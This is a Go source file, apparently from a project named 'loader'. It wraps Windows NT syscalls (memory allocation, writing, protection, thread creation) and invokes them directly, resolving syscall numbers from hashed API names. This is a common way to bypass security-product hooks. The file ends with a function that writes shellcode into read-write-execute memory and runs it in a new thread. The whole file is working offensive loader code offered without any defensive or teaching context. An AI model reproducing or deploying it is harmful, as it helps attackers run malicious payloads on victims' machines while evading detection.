package wrappers

import (
	"loader/pkg/resolve"
	"loader/pkg/obf"
	"loader/pkg/types"
	"unsafe"
	"fmt"
)

// Helper function to make NtAllocateVirtualMemory syscall
func ntAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType uint32, protect uint32) uint32 {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtAllocateVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType),
		uintptr(protect),
	)
	return uint32(ret)
}

// Helper function to make NtFreeVirtualMemory syscall
func ntFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) uint32 {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtFreeVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(freeType),
	)
	return uint32(ret)
}


// NtFreeVirtualMemory wrapper
func NtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtFreeVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtFreeVirtualMemory")
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(freeType),
	)
	return uint32(ret), nil
}

// NtUnmapViewOfSection wrapper
func NtUnmapViewOfSection(processHandle uintptr, baseAddress uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtUnmapViewOfSection"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtUnmapViewOfSection")
	}

	ret, _ := resolve.Syscall(syscallNum, processHandle, baseAddress)
	return uint32(ret), nil
}

// NtAllocateVirtualMemory wrapper
func NtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType uintptr, protect uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtAllocateVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtAllocateVirtualMemory")
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		allocationType,
		protect,
	)
	return uint32(ret), nil
}

// NtCreateThreadEx wrapper
func NtCreateThreadEx(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, parameter uintptr, createFlags uintptr, stackZeroBits uintptr, stackCommitSize uintptr, stackReserveSize uintptr, attributeList uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtCreateThreadEx"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtCreateThreadEx")
	}

	ret, _ := resolve.Syscall(syscallNum,
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		parameter,
		createFlags,
		stackZeroBits,
		stackCommitSize,
		stackReserveSize,
		attributeList,
	)
	return uint32(ret), nil
}

// NtWaitForSingleObject wrapper
func NtWaitForSingleObject(handle uintptr, alertable bool, timeout *int64) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtWaitForSingleObject"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtWaitForSingleObject")
	}

	var alertableVal uintptr
	if alertable {
		alertableVal = 1
	}

	var timeoutPtr uintptr
	if timeout != nil {
		timeoutPtr = uintptr(unsafe.Pointer(timeout))
	}

	ret, _ := resolve.Syscall(syscallNum, handle, alertableVal, timeoutPtr)
	return uint32(ret), nil
}

// NtClose wrapper
func NtClose(handle uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtClose"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtClose")
	}

	ret, _ := resolve.Syscall(syscallNum, handle)
	return uint32(ret), nil
}

// NtWriteVirtualMemory wrapper
func NtWriteVirtualMemory(processHandle uintptr, baseAddress uintptr, buffer *byte, numberOfBytesToWrite uintptr, numberOfBytesWritten *uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtWriteVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtWriteVirtualMemory")
	}

	var bytesWrittenPtr uintptr
	if numberOfBytesWritten != nil {
		bytesWrittenPtr = uintptr(unsafe.Pointer(numberOfBytesWritten))
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		baseAddress,
		uintptr(unsafe.Pointer(buffer)),
		numberOfBytesToWrite,
		bytesWrittenPtr,
	)
	return uint32(ret), nil
}

// NtReadVirtualMemory wrapper
func NtReadVirtualMemory(processHandle uintptr, baseAddress uintptr, buffer *byte, numberOfBytesToRead uintptr, numberOfBytesRead *uintptr) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtReadVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtReadVirtualMemory")
	}

	var bytesReadPtr uintptr
	if numberOfBytesRead != nil {
		bytesReadPtr = uintptr(unsafe.Pointer(numberOfBytesRead))
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		baseAddress,
		uintptr(unsafe.Pointer(buffer)),
		numberOfBytesToRead,
		bytesReadPtr,
	)
	return uint32(ret), nil
}

// NtProtectVirtualMemory wrapper
func NtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, numberOfBytesToProtect *uintptr, newAccessProtection uint32, oldAccessProtection *uint32) (uint32, error) {
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtProtectVirtualMemory"))
	if syscallNum == 0 {
		return types.STATUS_PROCEDURE_NOT_FOUND, fmt.Errorf("failed to resolve NtProtectVirtualMemory")
	}

	ret, _ := resolve.Syscall(syscallNum,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(numberOfBytesToProtect)),
		uintptr(newAccessProtection),
		uintptr(unsafe.Pointer(oldAccessProtection)),
	)
	return uint32(ret), nil
}

// NtInjectSelfShellcode wrapper - for shellcode injection
func NtInjectSelfShellcode(shellcode []byte) error {
	currentProcess := ^uintptr(0) // (HANDLE)-1
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))

	// Allocate memory
	status, err := NtAllocateVirtualMemory(currentProcess, &baseAddress, 0, &regionSize, 
		types.MEM_COMMIT|types.MEM_RESERVE, types.PAGE_EXECUTE_READWRITE)
	if status != 0 {
		return fmt.Errorf("failed to allocate memory for shellcode: status=0x%X, err=%v", status, err)
	}

	// Write shellcode
	syscallNum := resolve.GetSyscallNumber(obf.GetHash("NtWriteVirtualMemory"))
	if syscallNum == 0 {
		return fmt.Errorf("failed to resolve NtWriteVirtualMemory")
	}

	var bytesWritten uintptr
	ret, _ := resolve.Syscall(syscallNum,
		currentProcess,
		baseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret != 0 {
		return fmt.Errorf("failed to write shellcode: status=0x%X", ret)
	}

	// Create thread
	var threadHandle uintptr
	status, err = NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, currentProcess, baseAddress, 0, 0, 0, 0, 0, 0)
	if status != 0 {
		return fmt.Errorf("failed to create thread: status=0x%X, err=%v", status, err)
	}

	// Wait for thread
	NtWaitForSingleObject(threadHandle, false, nil)
	
	// Close thread handle
	NtClose(threadHandle)

	return nil
}